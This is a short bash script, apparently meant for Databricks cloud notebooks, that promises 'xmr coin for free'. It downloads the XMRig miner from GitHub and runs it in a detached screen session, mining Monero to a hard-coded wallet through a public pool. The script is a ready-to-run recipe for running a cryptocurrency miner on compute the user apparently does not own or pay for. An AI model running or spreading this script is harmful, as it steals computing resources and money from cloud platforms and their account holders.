#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 8BfuCgtDv93Ww7JAWHibdQAta8yF9YwawP2GGPj97TvELvUhLrJDe2x3WUDnoLKQ51ZjAGH6iPXubVDC1qiceZm9ShvFxjf -k --tls --rig-id Berkah
